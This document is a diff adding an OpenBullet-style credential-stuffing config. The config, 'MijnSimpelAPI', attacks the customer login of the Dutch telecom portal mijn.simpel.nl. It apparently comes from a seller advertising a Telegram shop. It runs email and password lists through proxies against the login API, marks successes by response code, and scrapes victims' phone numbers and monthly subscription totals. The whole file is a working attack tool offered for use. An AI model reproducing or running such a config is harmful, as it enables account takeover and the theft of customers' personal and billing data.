@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "MijnSimpelAPI",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-08T23:36:13.8127752+02:00",
+  "AdditionalInfo": "Capture: Phone number & Subscribtion Totals. | Channel: https://t.me/DedrilathShop",
+  "Author": "Dedrilath",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mijn.simpel.nl/api/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":null,\"preferredReturnUri\":\"https%3A%2F%2Fmijn.simpel.nl%2F\"}" 
+  CONTENTTYPE "application/json, text/plain, */*" 
+  HEADER "Host: mijn.simpel.nl" 
+  HEADER "Origin: https://mijn.simpel.nl" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://mijn.simpel.nl/login?returnUri=https%253A%252F%252Fmijn.simpel.nl%252F" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" DoesNotContain "400" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+
+REQUEST GET "https://mijn.simpel.nl" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<a href=\"https://mijn.simpel.nl/abonnement?sid=" "\">" -> VAR "SID" 
+
+PARSE "<SOURCE>" LR "<span class=\"c-selfcare-nav__phone\">" "</span>" CreateEmpty=FALSE -> CAP "Phone Number" 
+
+REQUEST GET "https://mijn.simpel.nl/abonnement?sid=<SID>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<dd class=\"c-subscription-bundle__totals\">&euro; " "</dd>" CreateEmpty=FALSE -> CAP "Bedrag per maand." 
+
